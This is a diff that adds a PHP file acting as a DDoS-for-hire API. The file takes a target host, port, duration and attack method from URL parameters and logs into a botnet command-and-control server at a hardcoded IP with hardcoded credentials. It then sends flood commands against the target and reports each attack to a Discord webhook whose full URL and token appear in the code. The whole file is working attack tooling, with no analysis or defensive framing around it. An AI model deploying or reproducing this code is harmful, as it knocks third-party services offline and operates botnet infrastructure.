@@ -1,0 +1,111 @@
+<?php
+//API Link: http://SERVERIP/api.php?&host=$host&port=$port&time=$time&type=$method
+set_time_limit(0);
+
+$server = "51.89.240.67";
+$conport = "25565"; //cHANGE "PORT" TO YOUR CNC PORT.
+$username = "Aariki";
+$password = "Aariki";
+
+$activekeys = array();
+
+$methodd = $_GET['type'];
+$target = $_GET['host'];
+$port = $_GET['port'];
+$time = $_GET['time'];
+
+if($methodd == "porn"){$command = "ovhrape $target $time $port";}
+if($methodd == "TCP"){$command = "- TCP $target $port $time 32 all 1337 400";}
+if($methodd == "STD"){$command = "- STD $target $port $time 1024";}
+if($methodd == "LYNX"){$command = "- LYNX $target $port $time 32 1024 10";}
+
+$sock = fsockopen($server, $conport, $errno, $errstr, 2);
+
+if(!$sock){
+        echo "Couldn't Connect To CNC Server...";
+} else{
+        print(fread($sock, 512)."\n");
+        fwrite($sock, $username . "\n");
+        echo "<br>";
+        print(fread($sock, 512)."\n");
+        fwrite($sock, $password . "\n");
+        echo "<br>";
+        if(fread($sock, 512)){
+                print(fread($sock, 512)."\n");
+        }
+
+        fwrite($sock, $command . "\n");
+        fclose($sock);
+        echo "<br>";
+        echo "> $command ";
+}
+$url = "https://discord.com/api/webhooks/818667617924415518/krqA5H9YW8v2dnlKb7xGWOVYe3WqM9U4iAbbguq0CSQ8HEgxW3bGZHsSLcr_GQex9lSY";
+$webhookurl = "https://discord.com/api/webhooks/818667617924415518/krqA5H9YW8v2dnlKb7xGWOVYe3WqM9U4iAbbguq0CSQ8HEgxW3bGZHsSLcr_GQex9lSY";
+$ip = $_SERVER['REMOTE_ADDR'];
+$page = $_SERVER['REQUEST_URI'];
+$date_time = date("l j F Y  g:ia", time() - date("Z")) ;
+$agent = $_SERVER['HTTP_USER_AGENT'];
+$barre = str_repeat("#",30);
+
+$json_data = json_encode([
+    // Message
+    //"content" => "** Tardddddget:** $target\n **Port:** $port\n **Time:** $time\n **Method:** $methodd\n\n - **Attack Sent To:** $server",
+
+    // Username
+    "username" => "AarikiSolutions API Request",
+
+    // Avatar URL.
+    // Uncoment to replace image set in webhook
+    "avatar_url" => "https://cdn.akamainetwork.host/AkamaiNetworkLogo.PNG?size=512",
+
+    // Text-to-speech
+    "tts" => false,
+
+    // File upload
+    // "file" => "",
+
+    // Embeds Array
+    "embeds" => [
+        [
+            // Embed Title
+            //"title" => "PHP - Send message to Discord (embeds) via Webhook",
+
+            // Embed Type
+            "type" => "rich",
+
+            // Embed Description
+            "description" => "** Target:** $target\n **Port:** $port\n **Time:** $time\n **Method:** $methodd\n\n - **Attack Sent To:** $server",
+
+            // URL of title link
+            //"url" => "https://cdn.akamainetwork.host/AkamaiNetworkLogo.PNG",
+
+            // Timestamp of embed must be formatted as ISO8601
+            //"timestamp" => $timestamp,
+
+            // Embed left border color in HEX
+            "color" => hexdec( "800080" ),
+
+            // Footer
+            "footer" => [
+                "text" => "daddysslaves.online",
+                //"icon_url" => "https://cdn.akamainetwork.host/AkamaiNetworkLogo.PNG?size=375"
+            ],
+        ]
+    ]
+
+], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );
+
+
+$ch = curl_init( $webhookurl );
+curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
+curl_setopt( $ch, CURLOPT_POST, 1);
+curl_setopt( $ch, CURLOPT_POSTFIELDS, $json_data);
+curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt( $ch, CURLOPT_HEADER, 0);
+curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);
+
+$response = curl_exec( $ch );
+// If you need to debug, or find out why you can't send message uncomment line below, and execute script.
+// echo $response;
+curl_close( $ch );
+?>
